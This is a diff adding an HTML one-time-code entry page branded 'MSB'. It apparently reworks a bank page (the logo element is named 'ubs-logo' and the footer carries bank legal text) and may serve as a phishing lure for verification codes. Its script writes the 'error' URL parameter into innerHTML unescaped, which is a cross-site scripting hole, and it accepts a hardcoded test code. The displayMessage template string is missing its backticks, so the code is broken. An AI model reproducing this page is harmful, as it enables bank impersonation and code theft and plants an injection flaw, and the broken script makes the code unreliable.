@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTP Verification MSB</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #494242;
+            /* Red background */
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            height: 100vh;
+        }
+
+        #container {
+            text-align: center;
+            margin-top: auto;
+        }
+
+        #otps {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .otp {
+            width: 40px;
+            height: 40px;
+            font-size: 20px;
+            text-align: center;
+            margin-right: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            outline: none;
+        }
+
+        .otp::placeholder {
+            font-size: 16px;
+        }
+
+        .submit-btn {
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .submit-btn:hover {
+            background-color: #45a049;
+        }
+
+        .submit-btn:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+        }
+
+        #ubs-logo {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            font-size: 24px;
+            font-weight: bold;
+            font-family: 'Comic Sans MS', cursive;
+            /* Change font to Comic Sans MS */
+            color: white;
+        }
+
+        h3 {
+            font-family: 'Comic Sans MS', cursive;
+            /* Change font to Comic Sans MS */
+            color: white;
+        }
+
+        footer {
+            margin-top: auto;
+            text-align: center;
+            color: white;
+            padding: 20px;
+        }
+
+        .error-message {
+            color: yellow;
+            font-size: 14px;
+            margin-top: 10px;
+            font-weight: bold;
+        }
+
+        .success-message {
+            color: #4CAF50;
+            font-size: 14px;
+            margin-top: 10px;
+            font-weight: bold;
+        }
+
+        .resend-link {
+            color: white;
+            margin-top: 15px;
+            cursor: pointer;
+            text-decoration: underline;
+        }
+
+        .resend-link:hover {
+            color: #cccccc;
+        }
+
+        .timer {
+            color: white;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+<div id="ubs-logo">MSB</div>
+<div id="container">
+    <h3>Please kindly input the Verification code sent to your email</h3>
+    <header>
+        <form id="otpForm" action="/VerifyOTP" method="post">
+            <div id="otps">
+                <input class="otp" type="text" name="digit_1" maxlength="1" required autofocus />
+                <input class="otp" type="text" name="digit_2" maxlength="1" required />
+                <input class="otp" type="text" name="digit_3" maxlength="1" required />
+                <input class="otp" type="text" name="digit_4" maxlength="1" required />
+                <input class="otp" type="text" name="digit_5" maxlength="1" required />
+                <input class="otp" type="text" name="digit_6" maxlength="1" required />
+            </div>
+            <button type="submit" class="submit-btn" id="submitBtn">Submit</button>
+        </form>
+
+        <!-- Error/Success message container -->
+        <div id="message-container"></div>
+
+        <!-- Resend OTP section -->
+        <div class="timer" id="timer">Resend OTP in: <span id="countdown">60</span> seconds</div>
+        <div class="resend-link" id="resendLink" style="display: none;" onclick="resendOTP()">Resend OTP</div>
+    </header>
+</div>
+<footer>
+    <h6>The products, services, information and/or materials contained within these web pages may not be available for residents of certain jurisdictions. Please consult the sales restrictions relating to the products or services in question for further</br>
+        information. Copying, editing, modifying, distributing, sharing, linking or any other use (whether for commercial purposes or otherwise) of this material, other than personal viewing, without MSB 's prior written permission is strictly prohibited.</br>
+        © MSB 1998 - 2024. All rights reserved.
+    </h6>
+</footer>
+
+<script>
+    // OTP input navigation
+    const otpInputs = document.querySelectorAll('.otp');
+    
+    otpInputs.forEach((input, index) => {
+        // Auto-tab to next input
+        input.addEventListener('input', (e) => {
+            if (e.target.value.length === 1 && index < otpInputs.length - 1) {
+                otpInputs[index + 1].focus();
+            }
+            validateOTP();
+        });
+
+        // Handle backspace
+        input.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                otpInputs[index - 1].focus();
+            }
+        });
+
+        // Handle paste
+        input.addEventListener('paste', (e) => {
+            e.preventDefault();
+            const pasteData = e.clipboardData.getData('text').slice(0, 6);
+            pasteData.split('').forEach((char, i) => {
+                if (otpInputs[i]) {
+                    otpInputs[i].value = char;
+                }
+            });
+            validateOTP();
+            if (otpInputs[5]) {
+                otpInputs[5].focus();
+            }
+        });
+    });
+
+    // Validate OTP function
+    function validateOTP() {
+        const submitBtn = document.getElementById('submitBtn');
+        const otp = getOTP();
+        submitBtn.disabled = otp.length !== 6;
+    }
+
+    // Get complete OTP
+    function getOTP() {
+        return Array.from(otpInputs).map(input => input.value).join('');
+    }
+
+    // Display message function
+    function displayMessage(message, type = 'error') {
+        const messageContainer = document.getElementById('message-container');
+        messageContainer.innerHTML = <div class="${type}-message">${message}</div>;
+        
+        // Auto-hide success messages after 3 seconds
+        if (type === 'success') {
+            setTimeout(() => {
+                messageContainer.innerHTML = '';
+            }, 3000);
+        }
+    }
+
+    // Form submission handler
+    document.getElementById('otpForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const otp = getOTP();
+        const submitBtn = document.getElementById('submitBtn');
+        
+        if (otp.length !== 6) {
+            displayMessage('Please enter all 6 digits of the OTP.');
+            return;
+        }
+
+        // Disable button and show loading state
+        submitBtn.disabled = true;
+        submitBtn.textContent = 'Verifying...';
+
+        // Simulate OTP verification (replace with actual API call)
+        setTimeout(() => {
+            // This is a simulation - replace with actual verification logic
+            if (otp === '123456') { // Default test OTP
+                displayMessage('OTP verified successfully! Redirecting...', 'success');
+                setTimeout(() => {
+                    window.location.href = '/dashboard.html';
+                }, 2000);
+            } else {
+                displayMessage('Invalid OTP. Please try again.');
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Submit';
+                
+                // Clear OTP fields
+                otpInputs.forEach(input => input.value = '');
+                otpInputs[0].focus();
+            }
+        }, 1500);
+    });
+
+    // Resend OTP functionality
+    let countdown = 60;
+    let countdownInterval;
+
+    function startTimer() {
+        const timerElement = document.getElementById('countdown');
+        const resendLink = document.getElementById('resendLink');
+        const timerContainer = document.getElementById('timer');
+        
+        countdown = 60;
+        timerContainer.style.display = 'block';
+        resendLink.style.display = 'none';
+        
+        countdownInterval = setInterval(() => {
+            countdown--;
+            timerElement.textContent = countdown;
+            
+            if (countdown <= 0) {
+                clearInterval(countdownInterval);
+                timerContainer.style.display = 'none';
+                resendLink.style.display = 'block';
+            }
+        }, 1000);
+    }
+
+    function resendOTP() {
+        // Simulate resending OTP (replace with actual API call)
+        displayMessage('New OTP has been sent to your email.', 'success');
+        startTimer();
+        
+        // Clear existing OTP
+        otpInputs.forEach(input => input.value = '');
+        otpInputs[0].focus();
+        document.getElementById('submitBtn').disabled = true;
+    }
+
+    // Initialize when page loads
+    document.addEventListener('DOMContentLoaded', function() {
+        startTimer();
+        validateOTP();
+        
+        // Check for URL parameters for error messages
+        const urlParams = new URLSearchParams(window.location.search);
+        const error = urlParams.get('error');
+        if (error) {
+            displayMessage(decodeURIComponent(error));
+        }
+    });
+</script>
+</body>
+</html>
